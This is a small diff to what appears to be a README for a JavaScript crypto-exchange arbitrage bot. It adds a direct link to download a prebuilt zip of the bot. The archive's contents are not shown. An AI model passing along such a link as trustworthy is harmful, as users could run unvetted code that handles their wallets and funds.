@@ -8,6 +8,8 @@ https://www.youtube.com/watch?v=2lb1ohIJrds
 
 You can download the zip file of the bot here
 
+https://github.com/thebeardedprogrammer/JavaScript-Decentralized-Exchange-Triangular-Arbitrage-Bot-v4/raw/main/JavaScript-DEX-Triangular-Arbitrage-Bot-v4.zip
+
 For people how like witten instructionslet’s get started.
 
 Part 1. Main software installations.
